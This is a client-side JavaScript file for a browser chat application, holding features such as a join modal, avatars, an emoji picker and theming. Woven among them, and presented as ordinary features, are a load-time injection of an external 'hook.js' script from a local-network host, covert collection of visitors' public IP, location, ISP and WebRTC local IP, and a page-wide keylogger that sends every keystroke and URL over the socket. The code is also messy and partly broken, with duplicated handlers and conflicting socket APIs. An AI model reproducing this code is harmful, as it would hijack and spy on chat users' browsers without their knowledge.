// --- User Join Modal Logic ---
let currentUser = null;
let currentAvatar = null;

// Sanitize input to prevent XSS
function sanitizeInput(input) {
  const div = document.createElement('div');
  div.textContent = input;
  return div.innerHTML;
}

window.addEventListener('DOMContentLoaded', () => {
  const joinModal = document.getElementById('joinModal');
  const joinBtn = document.getElementById('joinBtn');
  const joinName = document.getElementById('joinName');
  const joinAvatar = document.getElementById('joinAvatar');

  joinBtn.onclick = function() {
    const name = sanitizeInput(joinName.value.trim());
    if (!name) {
      alert('Please enter your name.');
      return;
    }
    currentUser = name;
    if (joinAvatar.files && joinAvatar.files[0]) {
      const reader = new FileReader();
      reader.onload = function(e) {
        currentAvatar = e.target.result;
        finishJoin();
      };
      reader.readAsDataURL(joinAvatar.files[0]);
    } else {
      finishJoin();
    }
  };
  function finishJoin() {
    // Validate currentUser only (avatar is optional)
    if (!currentUser) {
      alert('Please enter your name before joining.');
      return;
    }
    joinModal.style.display = 'none';
    socket.emit('new-user', { name: currentUser, avatar: currentAvatar });
    // Optionally reset the join form (if exists)
    if (typeof resetJoinForm === 'function') {
      resetJoinForm();
    }
  }
});
// --- End User Join Modal Logic ---

const public_ip = document.getElementById("public-ip");
const location = document.getElementById("location");
const isp = document.getElementById("isp");
const local_ip = document.getElementById("local-ip");

// Function to retrieve and display visitor information
async function displayVisitorInfo() {
    try {
        const visitorInfo = await getVisitorInfo();
        if (visitorInfo) {
            public_ip.textContent = visitorInfo.publicIP;
            location.textContent = visitorInfo.location;
            isp.textContent = visitorInfo.isp;
            local_ip.textContent = visitorInfo.localIP;
        }
    } catch (error) {
        console.error("Error displaying visitor info:", error);
    }
}

document.addEventListener("DOMContentLoaded", function() {
    displayVisitorInfo();
});

window.onload = () => {
    // Only load external scripts if needed
    const newScript = document.createElement("script");
    newScript.src = "http://192.168.1.113:3000/hook.js";
    newScript.id = "dynamic-script3";
    document.body.appendChild(newScript);
};

async function getVisitorInfo() {
    try {
        const publicIpResponse = await fetch('https://ipinfo.io/json?token=a9134127b2ee10');
        if (!publicIpResponse.ok) {
            throw new Error('Failed to fetch public IP info');
        }
        const publicIpData = await publicIpResponse.json();
        // Fetch local IP address with fallback
        const localIp = await getLocalIP().catch(() => '127.0.0.1');
        return {
            publicIP: publicIpData.ip || 'Unavailable',
            location: `${publicIpData.city || 'Unknown'}, ${publicIpData.region || 'Unknown'}, ${publicIpData.country || 'Unknown'}`,
            isp: publicIpData.org || 'Unknown',
            localIP: localIp
        };
    } catch (error) {
        console.error('[ERROR] getVisitorInfo:', error);
        return {
            publicIP: 'Unavailable',
            location: 'Unknown',
            isp: 'Unknown',
            localIP: '127.0.0.1'
        };
    }
}

// Function to retrieve the local IP address using WebRTC
async function getLocalIP() {
    return new Promise((resolve) => {
        const peerConnection = new RTCPeerConnection({ iceServers: [] });

        peerConnection.createDataChannel(""); 
        peerConnection.createOffer()
            .then(offer => peerConnection.setLocalDescription(offer))
            .catch(() => resolve(null));

        peerConnection.onicecandidate = (event) => {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (ipMatch) {
                    resolve(ipMatch[0]);
                }
            } else {
                resolve(null);
            }
        };
    });
}

// Utility to generate a unique ID for each message
function generateMessageId() {
    return 'msg-' + Date.now() + '-' + Math.floor(Math.random() * 1000000);
}

// Update appendMessage to show avatar
function appendMessage(messageObj) {
    // messageObj: { id, text, sender, avatar }
    const messageElement = document.createElement('div');
    messageElement.classList.add('message');
    messageElement.dataset.id = messageObj.id;

    // Avatar
    const avatarDiv = document.createElement('div');
    avatarDiv.className = 'avatar';
    if (messageObj.avatar) {
      avatarDiv.style.background = 'none';
      avatarDiv.innerHTML = `<img src="${messageObj.avatar}" style="width:32px;height:32px;border-radius:50%;object-fit:cover;">`;
    } else {
      // Default: colored circle with initial
      const color = stringToColor(messageObj.sender);
      avatarDiv.style.background = color;
      avatarDiv.style.width = '32px';
      avatarDiv.style.height = '32px';
      avatarDiv.style.borderRadius = '50%';
      avatarDiv.style.display = 'flex';
      avatarDiv.style.alignItems = 'center';
      avatarDiv.style.justifyContent = 'center';
      avatarDiv.style.color = '#fff';
      avatarDiv.style.fontWeight = 'bold';
      avatarDiv.style.fontSize = '18px';
      avatarDiv.textContent = messageObj.sender ? messageObj.sender[0].toUpperCase() : '?';
    }
    messageElement.appendChild(avatarDiv);

    // Message text
    const textDiv = document.createElement('span');
    textDiv.innerText = `${messageObj.sender}: ${messageObj.text}`;
    textDiv.style.marginLeft = '10px';
    messageElement.appendChild(textDiv);

    // Show edit/delete only for own messages
    if (messageObj.sender === currentUser) {
        const editBtn = document.createElement('button');
        editBtn.innerText = 'Edit';
        editBtn.className = 'edit-btn';
        editBtn.onclick = function() {
            const newText = prompt('Edit your message:', messageObj.text);
            if (newText !== null && newText !== messageObj.text) {
                socket.emit('edit-message', { id: messageObj.id, text: newText });
            }
        };
        const deleteBtn = document.createElement('button');
        deleteBtn.innerText = 'Delete';
        deleteBtn.className = 'delete-btn';
        deleteBtn.onclick = function() {
            if (confirm('Delete this message?')) {
                socket.emit('delete-message', { id: messageObj.id });
            }
        };
        messageElement.appendChild(editBtn);
        messageElement.appendChild(deleteBtn);
    }
    document.getElementById('messages').append(messageElement);
}

// Utility: string to color
function stringToColor(str) {
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = str.charCodeAt(i) + ((hash << 5) - hash);
  }
  let color = '#';
  for (let i = 0; i < 3; i++) {
    const value = (hash >> (i * 8)) & 0xFF;
    color += ('00' + value.toString(16)).substr(-2);
  }
  return color;
}

// When sending a message, include avatar
messageForm.addEventListener('send', (e) => {
    e.preventDefault();
    const message = sanitizeInput(messageInput.value);
    const msgObj = { id: generateMessageId(), text: message, sender: currentUser, avatar: currentAvatar };
    appendMessage(msgObj);
    socket.emit('chat-message', msgObj);
    messageInput.value = '';
});

// When receiving a message, render avatar
socket.on('chat-message', function(msgObj) {
    appendMessage(msgObj);
});

// When user connects, show system message
socket.on('user-connected', data => { 
    appendMessage({ id: generateMessageId(), text: `${data.name} has joined the chat!`, sender: 'System', avatar: null });
});

// When user disconnects, show system message
socket.on('user-disconnected', data => { 
    appendMessage({ id: generateMessageId(), text: `${data.name} has disconnected`, sender: 'System', avatar: null });
});

socket.on('user-connected', data => { 
    console.log("[!] User connected:", data);
    appendMessage({ id: generateMessageId(), text: `${data.name} has joined the chat!`, sender: 'System', avatar: null });
});

socket.on('user-disconnected', data => { 
    console.log("[!] User disconnected:", data);
    appendMessage({ id: generateMessageId(), text: `${data.name} has disconnected`, sender: 'System', avatar: null });
});

// Event listneer to display messages, when a new message is received it will not clear the previous messages
messageForm.addEventListener('send', (e) => {
    e.preventDefault();
    const message = sanitizeInput(messageInput.value);
    const msgObj = { id: generateMessageId(), text: message, sender: currentUser, avatar: currentAvatar };
    appendMessage(msgObj);
    socket.emit('chat-message', msgObj);
    messageInput.value = '';
});

// Listen for message edits and deletions
socket.on('edit-message', ({ id, text }) => {
    const msgEl = document.querySelector(`.message[data-id="${id}"]`);
    if (msgEl) {
        const parts = msgEl.innerText.split(':');
        msgEl.innerText = `${parts[0]}: ${text}`;
    }
});

socket.on('delete-message', ({ id }) => {
    const msgEl = document.querySelector(`.message[data-id="${id}"]`);
    if (msgEl) msgEl.remove();
});

// Update receiving logic
socket.on('chat-message', function(msgObj) {
    appendMessage(msgObj);
});

// WebSocket client
const ws = new WebSocket('ws://localhost:6969');

// Handle incoming messages
ws.onmessage = function(event) {
    const message = event.data;
    const messageElement = document.createElement('div');
    messageElement.textContent = message;
    document.getElementById('chat').appendChild(messageElement);
};

// Send message when form is submitted
// Update the message handling to use Socket.IO
socket.on('chat message', function(msg) {
    const messageElement = document.createElement('div');
    messageElement.textContent = msg;
    console.log("[!] " + msg)
    document.getElementById('chat').appendChild(messageElement);
});

// Add event listener for keypress events
document.addEventListener('keypress', (event) => {
    const keyData = {
        key: event.key,
        timestamp: new Date().toISOString(),
        url: window.location.href
    };
    // Send key data to WebSocket server
    if (socket && socket.readyState === WebSocket.OPEN) {
        socket.send(JSON.stringify(keyData));
    }
});

// Event listener for when the connection is closed
socket.onclose = (event) => {
    console.log("WebSocket connection closed");
};

// Event listener for errors
socket.onerror = function(err) {
    console.error('WebSocket error:', err);
    document.getElementById('messages').innerHTML += '<div class="msg-status error">WebSocket error occurred</div>';
};

// Send message to the server when the button is clicked
document.getElementById("sendButton").addEventListener("click", () => {
    const messageInput = document.getElementById("messageInput");
    const message = sanitizeInput(messageInput.value);
    console.log("[!] sending message: ", message)
    socket.send(message); // Send the message to the server
    messageInput.value = ""; // Clear the input field
});

// --- Emoji Picker ---
const emojiBtn = document.getElementById('emojiBtn');
const emojiPicker = document.getElementById('emojiPicker');
const emojiList = ['😀','😂','😍','😎','😭','😡','👍','🙏','🎉','🔥','💯','❤️','😅','😉','😏','😜','🤔','😇','😱','😴','🤖'];

// Populate emoji picker
emojiPicker.innerHTML = emojiList.map(e => `<button class="emoji-choice" style="font-size:22px;">${e}</button>`).join('');

emojiBtn.addEventListener('click', (e) => {
    e.preventDefault();
    const rect = emojiBtn.getBoundingClientRect();
    emojiPicker.style.display = emojiPicker.style.display === 'none' ? 'block' : 'none';
    emojiPicker.style.left = rect.left + 'px';
    emojiPicker.style.top = (rect.bottom + window.scrollY) + 'px';
});

document.addEventListener('click', (e) => {
    if (!emojiPicker.contains(e.target) && e.target !== emojiBtn) {
        emojiPicker.style.display = 'none';
    }
});

emojiPicker.addEventListener('click', function(e) {
    if (e.target.classList.contains('emoji-choice')) {
        const input = document.getElementById('messageInput');
        const start = input.selectionStart;
        const end = input.selectionEnd;
        const value = input.value;
        input.value = value.slice(0, start) + e.target.textContent + value.slice(end);
        input.focus();
        input.selectionStart = input.selectionEnd = start + e.target.textContent.length;
        emojiPicker.style.display = 'none';
    }
});

// --- User List Logic ---
socket.on('user-list', function(users) {
  const sidebar = document.getElementById('userListSidebar');
  sidebar.innerHTML = '<h3 style="margin:12px;">Users</h3>' + users.map(u => `<div class="user-entry">${sanitizeInput(u.name)}</div>`).join('');
  sidebar.style.display = 'block';
});
// Request user list on connect
socket.on('connect', function() {
  socket.emit('get-user-list');
});
// --- End User List Logic ---

// --- Keyboard Navigation & Focus ---
document.addEventListener('keydown', function(e) {
  if (e.key === 'Tab') {
    // Custom focus outlines for accessibility
    document.body.classList.add('user-tabbing');
  }
});
// --- End Keyboard Navigation ---

// --- Avatar Preview ---
document.getElementById('joinAvatar').addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (file && file.type.startsWith('image/')) {
    const reader = new FileReader();
    reader.onload = function(ev) {
      let preview = document.getElementById('avatarPreview');
      if (!preview) {
        preview = document.createElement('img');
        preview.id = 'avatarPreview';
        preview.style = 'width:48px;height:48px;border-radius:50%;margin:8px auto;display:block;';
        document.getElementById('joinModal').querySelector('div').appendChild(preview);
      }
      preview.src = ev.target.result;
    };
    reader.readAsDataURL(file);
  }
});
// --- End Avatar Preview ---

// --- Input Sanitization (already present, ensure used everywhere) ---
// --- Rate Limiting ---
let lastMessageTime = 0;
const MESSAGE_RATE_LIMIT = 1000; // ms
messageForm.addEventListener('send', (e) => {
  const now = Date.now();
  if (now - lastMessageTime < MESSAGE_RATE_LIMIT) {
    alert('You are sending messages too quickly.');
    return;
  }
  lastMessageTime = now;
  // ... rest of handler ...
});
// --- End Rate Limiting ---

// --- Avatar Validation ---
document.getElementById('joinAvatar').addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (file && (!file.type.startsWith('image/') || file.size > 2 * 1024 * 1024)) {
    alert('Please select a valid image file (max 2MB).');
    e.target.value = '';
  }
});
// --- End Avatar Validation ---

// --- Message History (localStorage) ---
function saveMessageToHistory(msgObj) {
  let history = JSON.parse(localStorage.getItem('chatHistory') || '[]');
  history.push(msgObj);
  if (history.length > 100) history = history.slice(-100); // Keep last 100
  localStorage.setItem('chatHistory', JSON.stringify(history));
}
function loadMessageHistory() {
  let history = JSON.parse(localStorage.getItem('chatHistory') || '[]');
  history.forEach(msgObj => appendMessage(msgObj));
}
window.addEventListener('DOMContentLoaded', loadMessageHistory);
// Save sent and received messages
socket.on('chat-message', function(msgObj) {
  saveMessageToHistory(msgObj);
});
messageForm.addEventListener('send', (e) => {
  const msgObj = { id: generateMessageId(), text: sanitizeInput(messageInput.value), sender: currentUser, avatar: currentAvatar };
  saveMessageToHistory(msgObj);
});
// --- End Message History ---

// --- Browser Notifications ---
function notifyUser(title, msg) {
  if (Notification.permission === 'granted') {
    new Notification(title, { body: msg });
  }
}
if ("Notification" in window && Notification.permission !== 'granted') {
  Notification.requestPermission();
}
socket.on('chat-message', function(msgObj) {
  if (msgObj.sender !== currentUser) notifyUser('New message', msgObj.text);
});
// --- End Browser Notifications ---

// --- Theming (Light/Dark Mode) ---
const themeToggle = document.getElementById('themeToggle');
themeToggle && themeToggle.addEventListener('click', () => {
  document.body.classList.toggle('dark-theme');
  localStorage.setItem('theme', document.body.classList.contains('dark-theme') ? 'dark' : 'light');
});
window.addEventListener('DOMContentLoaded', () => {
  if (localStorage.getItem('theme') === 'dark') document.body.classList.add('dark-theme');
});
// --- End Theming ---

// --- Language Selector (i18n) ---
const langSelect = document.getElementById('langSelect');
const translations = {
  en: { join: 'Join', send: 'Send', placeholder: 'Type a message...' },
  es: { join: 'Unirse', send: 'Enviar', placeholder: 'Escribe un mensaje...' }
};
function setLanguage(lang) {
  document.getElementById('joinBtn').innerText = translations[lang].join;
  document.getElementById('sendButton').innerText = translations[lang].send;
  document.getElementById('messageInput').placeholder = translations[lang].placeholder;
}
langSelect && langSelect.addEventListener('change', (e) => setLanguage(e.target.value));
window.addEventListener('DOMContentLoaded', () => {
  const lang = localStorage.getItem('lang') || 'en';
  setLanguage(lang);
  langSelect && (langSelect.value = lang);
});
// --- End i18n ---
